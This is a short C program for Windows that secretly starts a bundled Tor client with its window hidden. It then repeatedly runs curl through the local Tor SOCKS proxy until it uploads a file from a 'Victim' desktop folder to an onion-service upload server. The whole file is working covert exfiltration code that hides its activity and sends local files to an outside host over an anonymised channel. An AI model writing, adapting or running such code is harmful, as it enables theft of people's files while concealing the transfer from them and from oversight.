#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Configure startup flags to specify window display state
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Requests the main window be hidden on creation

    // Target executable path
    wchar_t commandLine[] = L"C:\\Users\\Victim\\Desktop\\tor-expert-bundle-windows-x86_64-15.0.24.tar\\tor-expert-bundle-windows-x86_64-15.0.24\\tor\\tor.exe";

    // Create the process
    BOOL result = CreateProcessW(
        NULL,           // Application name
        commandLine,    // Command line
        NULL,           // Process security attributes
        NULL,           // Thread security attributes
        FALSE,          // Inherit handles
        CREATE_NO_WINDOW,              // Creation flags (e.g., CREATE_NO_WINDOW for console apps)
        NULL,           // Environment block
        NULL,           // Current directory
        &si,            // STARTUPINFO pointer
        &pi             // PROCESS_INFORMATION pointer
    );

    if (result) {
        // Clean up handles once no longer needed
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        wprintf(L"CreateProcess failed with error: %lu\n", GetLastError());
    }
    //Sleep(10000); //sleep 10 seconds

    int cmd_result = 1;
    do {
        printf("[-] Trying to send file...\n");
        cmd_result = system("curl.exe -u uploaduser:123 --socks5-hostname 127.0.0.1:9050 -T \"C:\\Users\\Victim\\Desktop\\win_test.txt\" \"http://s2ybv7hq7vq6zkokzob2ipvrnne4e2mmjgcob5primnnb263lnq4hbyd.onion/uploads/win_test_3.txt\"");
    } while (cmd_result != 0);
    printf("[+] sent file success\n");
    return 0;
}